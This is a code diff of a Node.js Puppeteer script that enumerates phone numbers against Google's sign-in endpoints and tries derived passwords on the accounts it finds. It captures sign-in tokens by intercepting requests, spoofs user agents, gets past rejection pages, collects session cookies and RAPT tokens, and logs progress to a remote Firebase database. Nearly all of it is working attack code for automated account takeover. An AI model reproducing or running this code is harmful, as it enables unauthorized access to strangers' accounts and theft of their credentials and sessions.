@@ -11,35 +11,39 @@ let CODE = null
 let database = new admin()
 
 let mServerData = null
-let mSearch = false
 let mHostGPS = null
 let page = null
 let mRecovery = null
 let mReloadPage = false
+let mTokenSearch = false
+let mToken = null
 
 let mTimeToken = null
 let mMultiPol = 0
-let mStatus = 0
 
-let signIn = 'https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&rip=1&nojavascript=1&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&service=accountsettings'
+let signIn = 'https://accounts.google.com/v3/signin/identifier?dsh=S486911370%3A1660878859035702&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmyaccount.google.com%2Fphone&hl=en&osid=1&passive=1209600&service=accountsettings&ifkv=AQN2RmXi5hQ0UNg2WdE-Q0uN6EkRajDJS8t2hGYrxhAUzrUw9wzthNS-fBecP-ZTszEMzP8_Je0p'
 
 fs.copyFile('redirect.js', 'node_modules/request/lib/redirect.js', (err) => {
     if(!err) {
-        process.argv.slice(2).forEach(function (val, index) {
-            if (index === 0) {
-                SERVER = 'server'+val
-                database.connect((error) => {
-                    if(!error) {
-                        request({
-                            url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/code/server/'+SERVER+'.json',
-                            json:true
-                        }, function(error, response, body){
-                            if(!(error || body == null)) {
-                                CODE = body['code']
-                                COUNTRY = body['name']
-                                mServerData = body
-                                console.log('start browser')
-                                browserStart()
+        fs.copyFile('NavigatorWatcher.js', 'node_modules/puppeteer/lib/NavigatorWatcher.js', (err) => {
+            if(!err) {
+                process.argv.slice(2).forEach(function (val, index) {
+                    if (index === 0) {
+                        SERVER = 'server'+val
+                        database.connect((error) => {
+                            if(!error) {
+                                request({
+                                    url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/code/server/'+SERVER+'.json',
+                                    json:true
+                                }, function(error, response, body){
+                                    if(!(error || body == null)) {
+                                        CODE = body['code']
+                                        COUNTRY = body['name']
+                                        mServerData = body
+                                        console.log('start browser')
+                                        browserStart()
+                                    }
+                                })
                             }
                         })
                     }
@@ -56,7 +60,6 @@ async function browserStart() {
         mRecovery = JSON.parse(fs.readFileSync('./recovery.json'))
 
         let browser = await puppeteer.launch({
-            //executablePath : "/usr/lib/chromium-browser/chromium-browser",
             headless: true,
             args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
         })
@@ -65,11 +68,25 @@ async function browserStart() {
     
         await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')
 
+        await page.setRequestInterceptionEnabled(true)
+    
+        page.on('request', async req => {
+            if(req.url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe') && req.method == 'POST') {
+                mToken = req.postData
+                req.abort()
+                await delay(100)
+                page.goBack()
+                await delay(500)
+                mTokenSearch = false
+            } else {
+                req.continue()
+            }
+        })
+
         await page.goto(signIn)
+        
     
         let cookie = await page.cookies()
-
-        console.log(mServerData)
 
         cookie.forEach(function (value) {
             if (value.name == '__Host-GAPS') {
@@ -92,19 +109,21 @@ async function browserStart() {
                     number = start * mMultiPol
                 }
                 if(number != 0) {
-                    checkNumber(number, runing, start, 0)
+                    //if(key == 'start_1') {
+                        checkNumber(number, runing, start, 0)
+                    //}
                 }
             }
         }
         
     })()
-} 
+}
 
 
 function checkNumber(number, name, start, runing) {
     runing++
     let temp = runing
-    if(temp >= 100) {
+    if(temp >= 50) {
         console.log('Check: '+number)
         database.set('/code/server/'+SERVER+'/'+name, number)
         temp = 0
@@ -124,6 +143,7 @@ function checkNumber(number, name, start, runing) {
             try {
                 let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                 if(data[0][1] == 16) {
+                    console.log('Found: '+data[0][4])
                     logInNumber(number, data[0][4].replace(/[^0-9]/g, ''), name, start, temp)
                 } else {
                     checkNumber(number+1, name, start, temp)
@@ -137,50 +157,26 @@ function checkNumber(number, name, start, runing) {
 
 
 async function logInNumber(number, password, name, start, runing) {
-    if(!mReloadPage) {
-        let Identifier = await getIdentifierData(CODE+number)
-        let bodyData = getNumberData(CODE+number, Identifier)
-
-        var headers = {
-            'Host': 'accounts.google.com',
-            'Cache-Control': 'max-age=0',
-            'Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
-            'Sec-Ch-Ua-Mobile': '?0',
-            'Sec-Ch-Ua-Platform': '"Windows"',
-            'Upgrade-Insecure-Requests': '1',
-            'Origin': 'https://accounts.google.com',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'X-Chrome-Id-Consistency-Request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=d7a27b6a-dde9-4208-958e-451604994709,signin_mode=all_accounts,signout_mode=show_confirmation',
-            'X-Client-Data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiUocsBCPO7zAEIzLzMAQjzwMwBCJrBzAEIs8HMAQjEwcwBCNbBzAEI3sTMAQjXxswBCJ3JzAEI48vMAQ==',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-User': '?1',
-            'Sec-Fetch-Dest': 'document',
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cookie': '__Host-GAPS='+mHostGPS
-        }
-
-        request({
-            url: 'https://accounts.google.com/signin/v1/lookup',
-            method: 'POST',
-            headers: headers,
-            gzip: true,
-            body: bodyData
-        }, function(error, response, body) {
-            let check = false
-            try {
-                if (!error) {
-                    let headers = response.headers
-                    if(headers && headers['location']) {
-                        let index = headers['location'].indexOf('TL=')
-                        if(index != -1) {
-                            let split = headers['location'].substring(index+3, headers['location'].length).split('&')
-                            check = true
-                            passwordTry(password, split[0], Identifier, split[split.length-1].replace('cid=', ''), null, 0, 0, number, name, start, runing)
-                        } else if(headers['location'].startsWith('https://accounts.google.com/signin/rejected')) {
+    ;(async () => {
+        if(!mReloadPage) {
+            let Identifier = await getIdentifierData(CODE+number)
+            
+            request({
+                url: 'https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe',
+                method: 'POST',
+                body: Identifier,
+                headers:  {
+                    'X-Goog-Ext-278367001-Jspb': '["GlifWebSignIn"]',
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
+                    'Cookie': '__Host-GAPS='+mHostGPS
+                }
+            }, function(error, response, body) {
+                let check = false
+                try {
+                    if (!error) {
+                        let temp = JSON.parse(body.substring(body.indexOf('[['), body.length))
+                        if(temp[0][2].includes('/v3/signin/rejected')) {
                             check = true
                             ;(async () => {
                                 console.log('Reload Page')
@@ -189,24 +185,32 @@ async function logInNumber(number, password, name, start, runing) {
                                 mReloadPage = false
                                 logInNumber(number, password, name, start, runing)
                             })()
+                        } else {
+                            let data = JSON.parse(temp[0][2])
+                            if(data.length >= 22) {
+                                let out = data[21][1][0][1]
+                                if(!(out[0][1] == null || out[1][1] == null)) {
+                                    check = true
+                                    passwordTry(password, out[1][1], out[0][1], null, 0, 0, number, name, start, runing)
+                                }
+                            }
                         }
-                    }
-                } else {}
-            } catch (e) {}
-            
-            if(!check) {
-                console.log(response.headers)
-                checkNumber(number+1, name, start, runing)
-            }
-        })
-    } else {
-        setTimeout(function () {
+                    } else {}
+                } catch (e) {}
+                
+                if(!check) {
+                    console.log('H-Captcha Found')
+                    checkNumber(number+1, name, start, runing)
+                }
+            })
+        } else {
+            await delay(1000)
             logInNumber(number, password, name, start, runing)
-        }, 1000)
-    }
+        }
+    })()
 }
 
-function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, number, name, start, runing) {
+function passwordTry(password, TL, type, sendCookies, again, loop, number, name, start, runing) {
     let pass = password
     if(loop == 1) {
         pass = password.substring(0, 8)
@@ -217,7 +221,7 @@ function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, n
     request({
         url: 'https://accounts.google.com/_/signin/challenge?hl=en&TL='+TL+'&_reqid=999999',
         method: 'POST',
-        body: getPasswordData(pass, Identifier, parseInt(type)),
+        body: getPasswordData(pass, parseInt(type)),
         headers: {
             'Cookie': again==1?'__Host-GAPS='+mHostGPS+'; '+sendCookies:'__Host-GAPS='+mHostGPS,
             'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
@@ -234,16 +238,12 @@ function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, n
                     if(password.length > 8) {
                         if(loop == 0) {
                             output = 1
-                            passwordTry(password, TL, Identifier, type, null, 0, 1, number, name, start, runing)
+                            passwordTry(password, TL, type, null, 0, 1, number, name, start, runing)
                         } else if(loop == 1) {
                             output = 1
-                            passwordTry(password, TL, Identifier, type, null, 0, 2, number, name, start, runing)
+                            passwordTry(password, TL, type, null, 0, 2, number, name, start, runing)
                         } else if(loop == 2) {
-                            if(mStatus > 10) {
-                                mStatus = 0
-                                console.log(CODE+number+' Matching Faild')
-                            }
-                            mStatus++
+                            console.log('Matching Faild')
                         }
                     }
                 } else if(data[0][3] == 3) {
@@ -256,7 +256,7 @@ function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, n
                     let cookiesList = responce.headers['set-cookie']
                     if(cookiesList) {
                         output = 2
-                        getRaptToken(pass, cookiesList, Identifier, number, name, start, runing)
+                        getRaptToken(pass, cookiesList, number, name, start, runing)
                     }
                 }
             } catch (e) {}
@@ -275,7 +275,7 @@ function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, n
                         method: 'GET',
                         headers: {
                             'Cookie': sendCookies,
-                            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3193.0 Safari/537.36'
+                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                         }
                     }, function(error, responce, body) {
                         let wrong = true
@@ -321,7 +321,7 @@ function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, n
                                                     method: 'GET',
                                                     headers: {
                                                         'Cookie': sendCookies,
-                                                        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3193.0 Safari/537.36'
+                                                        'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                                                     }
                                                 }, function(error, response, body) {
                                                     try {
@@ -385,7 +385,7 @@ function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, n
     })
 }
 
-function getRaptToken(password, cookiesList, Identifier, number, name, start, runing) {
+function getRaptToken(password, cookiesList, number, name, start, runing) {
     let sendCookies = ''
     
     for(let i=0; i<cookiesList.length; i++) {
@@ -406,7 +406,7 @@ function getRaptToken(password, cookiesList, Identifier, number, name, start, ru
         method: 'GET',
         headers: {
             'Cookie': sendCookies,
-            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3193.0 Safari/537.36'
+            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
         }
     }, function(error, response, body) {
         let check = false
@@ -422,7 +422,7 @@ function getRaptToken(password, cookiesList, Identifier, number, name, start, ru
                         method: 'GET',
                         headers: {
                             'Cookie': sendCookies,
-                            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3193.0 Safari/537.36'
+                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                         }
                     }, function(error, response, body) {
                         let check = false
@@ -446,7 +446,7 @@ function getRaptToken(password, cookiesList, Identifier, number, name, start, ru
                                             }
                                         } catch (e) {}
                                     }
-                                    passwordTry(password, split[0], Identifier, split[split.length-1].replace('cid=', ''), sendCookies, 1, 0, number, name, start, runing)
+                                    passwordTry(password, split[0], split[split.length-1].replace('cid=', ''), sendCookies, 1, 0, number, name, start, runing)
                                 }
                             } else {}
                         } catch (e) {}
@@ -589,12 +589,9 @@ function getNumberTempData(number) {
     return 'f.req='+encodeURIComponent(JSON.stringify(freq))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",getIdentifier()]))
 }
 
-function getNumberData(number, identify) {
-    return  'service=accountsettings&bgresponse='+encodeURIComponent(identify, "UTF-8")+'&Email='+encodeURIComponent(number, "UTF-8")+'&signIn=Next'
-}
 
-function getPasswordData(password, identify, type) {
-    return 'continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",identify]))
+function getPasswordData(password, type) {
+    return 'continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",'Hi, Google Team. My name is Raiyan. You want contact me? It is my mail adress raiyanhossain088@gmail.com']))
 }
 
 function getRecoveryData(gmail) {
@@ -623,19 +620,36 @@ function getIdentifier() {
     return data
 }
 
-async function getIdentifierData(number) {
-    let responce = null
+async function getIdentifierData(num) {
+    let number = num
+    let getToken = null
     while(true) {
-        if(!mSearch) {
-            mSearch = true
-            responce = getIdentifierToken(number)
-            if(responce) {
-                mSearch = false
+        if(getToken != null) {
+            break
+        }
+        if(!mTokenSearch) {
+            mToken = null
+            mTokenSearch = true
+            await page.evaluate((number) => { 
+                let root = document.querySelector('input[type="email"]')
+                if(root) {
+                    root.value = number
+                    return true
+                }
+                return false
+            }, number)
+
+            await page.evaluate(() => document.querySelector('#identifierNext').click())
+        } else {
+            if(mToken != null) {
+                getToken = mToken
+                mToken = null
                 break
             }
+            await delay(500)
         }
     }
-    return responce
+    return getToken
 }
 
 async function getIdentifierToken(number) {
